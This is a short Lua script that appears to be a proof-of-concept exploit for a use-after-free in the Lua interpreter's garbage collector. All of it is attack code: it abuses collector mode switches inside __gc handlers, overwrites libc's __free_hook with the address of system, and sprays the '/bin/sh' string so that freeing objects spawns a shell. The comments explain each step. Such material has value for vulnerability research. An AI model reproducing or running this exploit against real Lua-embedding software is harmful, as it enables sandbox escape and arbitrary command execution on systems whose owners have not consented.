k = coroutine.create(function() print("hello") end) -- make coroutine

free_hook = package.loadlib('libc.so.6', '__free_hook') -- __free_hook address
system = package.loadlib('libc.so.6', 'system') -- system address


collectgarbage("incremental", 10)

for i = 1, 5 do
    local a = setmetatable(
        {},
        {
            __gc = function()
                collectgarbage("generational")
            end
        }
    )
    for j = 1, 15 do
        a[1] = {free_hook} -- write free_hook address in freed chunk
    end
end

for i=1, 3 do
    a = {}
    a[1] = system
end


a = {system} -- write system address in freed object(__free_hook)

for i=1, 1000 do
    a = {}
    a[1] = 0x68732f6e69622f --set "/bin/sh" for system
end

-- At end of this script, free all objects and __free_hook will be called
-- so free(object) -> system("/bin/sh")